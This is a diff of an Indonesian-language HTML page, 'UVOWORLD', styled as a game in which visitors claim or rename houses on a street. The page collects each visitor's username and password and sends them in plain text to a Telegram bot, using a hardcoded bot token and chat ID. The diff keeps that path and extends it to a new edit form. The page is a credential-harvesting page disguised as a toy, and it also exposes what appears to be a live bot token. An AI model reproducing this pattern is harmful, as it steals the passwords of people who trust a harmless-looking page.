@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>UVOWORLD - Klaim Rumah</title>
+  <title>UVOWORLD - Rumah Interaktif</title>
   <style>
     body {
       font-family: sans-serif;
@@ -31,6 +31,8 @@
       cursor: pointer;
       box-shadow: 2px 2px 5px rgba(0,0,0,0.2);
     }
+    .klaim { background-color: #cce; }
+    .sudah { background-color: #aaffaa; }
     #formBox {
       display: none;
       margin-top: 20px;
@@ -59,7 +61,7 @@
 <body>
 
 <h1>🏡 UVOWORLD</h1>
-<p>Klik salah satu rumah di jalan untuk klaim</p>
+<p>Klik salah satu rumah di jalan untuk klaim atau edit</p>
 
 <div class="jalan" id="jalan"></div>
 
@@ -67,67 +69,72 @@
   <h3 id="judulForm">Klaim Rumah</h3>
   <input id="username" placeholder="Username">
   <input id="password" type="password" placeholder="Password">
-  <button onclick="kirim()">Klaim Sekarang</button>
+  <input id="newName" placeholder="Nama Rumah Baru (opsional)">
+  <button onclick="kirim()">Kirim</button>
 </div>
 
 <script>
-  const botToken = "7961343490:AAGKb3JPPVBj1egmQU0hq2VfZTFmlx1zpi8"; // GANTI setelah tes!
-  const chatId = "6501126879"; // Chat ID kamu (@uvostorecs)
+  const botToken = "7961343490:AAGKb3JPPVBj1egmQU0hq2VfZTFmlx1zpi8";
+  const chatId = "6501126879";
 
+  const rumahStatus = Array(10).fill(null); // null = belum diklaim
   let rumahAktif = -1;
 
-  function buatRumah() {
+  function renderRumah() {
     const jalan = document.getElementById("jalan");
     jalan.innerHTML = "";
-    for (let i = 1; i <= 10; i++) {
+    rumahStatus.forEach((rumah, i) => {
       const div = document.createElement("div");
-      div.className = "rumah";
-      div.innerText = `Rumah ${i}`;
+      div.className = "rumah " + (rumah ? "sudah" : "klaim");
+      div.innerText = rumah ? rumah.nama : `Rumah ${i+1}`;
       div.onclick = () => bukaForm(i);
       jalan.appendChild(div);
-    }
+    });
   }
 
-  function bukaForm(nomor) {
-    rumahAktif = nomor;
+  function bukaForm(index) {
+    rumahAktif = index;
     document.getElementById("formBox").style.display = "block";
-    document.getElementById("judulForm").innerText = `Klaim Rumah ${nomor}`;
+    document.getElementById("judulForm").innerText = rumahStatus[index] ?
+      `Edit Rumah ${index+1}` : `Klaim Rumah ${index+1}`;
   }
 
   function kirim() {
     const user = document.getElementById("username").value.trim();
     const pass = document.getElementById("password").value.trim();
+    const nama = document.getElementById("newName").value.trim();
 
-    if (!user || !pass || rumahAktif === -1) {
-      alert("Lengkapi semua kolom dulu!");
-      return;
-    }
+    if (!user || !pass) return alert("Isi username & password!");
 
-    const pesan = `🏠 *Klaim Rumah ${rumahAktif}*\n👤 Username: *${user}*\n🔒 Password: \`${pass}\``;
+    let text = rumahStatus[rumahAktif] ?
+      `✏️ Edit Rumah ${rumahAktif+1}\n👤 Username: ${user}\n🔒 Password: ${pass}\n🏠 Nama Baru: ${nama || '(tidak diubah)'}` :
+      `✅ Klaim Rumah ${rumahAktif+1}\n👤 Username: ${user}\n🔒 Password: ${pass}`;
 
     fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text: pesan,
-        parse_mode: "Markdown"
-      })
+      body: JSON.stringify({ chat_id: chatId, text: text })
     })
     .then(res => res.json())
-    .then(data => {
-      alert("✅ Klaim berhasil dikirim ke bot!");
+    .then(() => {
+      alert("✅ Berhasil dikirim ke bot!");
+      if (!rumahStatus[rumahAktif]) {
+        rumahStatus[rumahAktif] = { user, pass, nama: nama || `Rumah ${rumahAktif+1}` };
+      } else {
+        if (rumahStatus[rumahAktif].user === user && rumahStatus[rumahAktif].pass === pass) {
+          rumahStatus[rumahAktif].nama = nama || rumahStatus[rumahAktif].nama;
+        } else {
+          alert("❌ Login gagal. Username/password salah.");
+          return;
+        }
+      }
       document.getElementById("formBox").style.display = "none";
-      document.getElementById("username").value = "";
-      document.getElementById("password").value = "";
+      renderRumah();
     })
-    .catch(err => {
-      alert("❌ Gagal kirim ke bot.");
-      console.error(err);
-    });
+    .catch(() => alert("❌ Gagal kirim ke bot."));
   }
 
-  buatRumah();
+  renderRumah();
 </script>
 
 </body>
